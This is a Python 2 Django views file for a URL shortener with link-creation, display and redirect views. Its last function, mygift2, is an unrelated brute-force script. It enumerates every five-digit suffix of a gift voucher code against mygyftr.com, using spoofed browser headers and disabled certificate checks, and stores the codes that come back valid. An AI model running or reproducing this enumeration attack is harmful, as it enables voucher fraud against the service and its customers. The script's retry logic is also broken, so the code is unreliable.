from django.views.generic.edit import CreateView
from django.views.generic import DetailView
from django.views.generic.base import RedirectView
from django.conf import settings
from .models import *
from django.shortcuts import redirect
import requests
import time
from django.views.decorators.csrf import csrf_exempt
from urlparse import urlparse
from random import randint

class LinkCreate(CreateView):
	model = Link
	fields = ["url"]

	def form_valid(self, form):
		prev = Link.objects.filter(url=form.instance.url)
		if prev:
			return redirect("link_show", pk=prev[0].pk)
		return super(LinkCreate, self).form_valid(form)

	def get_context_data(self, **kwargs):
		context = super(LinkCreate, self).get_context_data(**kwargs)
		# Passing site_url to display domain base
		context['site_url'] = settings.SITE_URL
		return context

class LinkShow(DetailView):
	model = Link
	def get_context_data(self, **kwargs):
		context = super(LinkShow, self).get_context_data(**kwargs)
		context['site_url'] = settings.SITE_URL
		return context


class RedirectToLongURL(RedirectView):

	permanent = False

	def get_redirect_url(self, *args, **kwargs):
		short_url = kwargs["short_url"]
		return Link.expand(short_url)
		
def mygift2(self):
	if 1==1:
		arr= "0123456789";
		for x in range(0,10):
			for y in range(0,10):
				for z in range(0,10):
					for l in range(0,10):
						for m in range(0,10):
							code=arr[x]+arr[y]+arr[z]+arr[l]+arr[m];
							#code="72376";
							print code;
							url="http://www.mygyftr.com/info/check_voucher/DPP2NZJ"+str(code);
							headers={"Host":"www.mygyftr.com", "Connection": "keep-alive","X-fancyBox": "true","Accept": "text/html, */*; q=0.01","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36","Referer": "https://www.mygyftr.com/pizzahut","Accept-Encoding": "gzip, deflate, sdch, br","Accept-Language": "en-US,en;q=0.8"};
							r=requests.get(url,headers=headers,verify=False);
							print r.content;
							if '<span class="detail">VALID</span>' in r.content:
								print "Done";
								M=Auth(authc=code,count=1,mail="domini",rmail="");
								M.save();
								time.sleep(1)
							elif '<div class="records">No Records Found!</div>' in r.content :
								print "failed";
								time.sleep(1)
							elif '<head><title>504 Gateway Time-out</title></head>' in r.content :
								print "Waiting";
								m=m-1;
								time.sleep(15)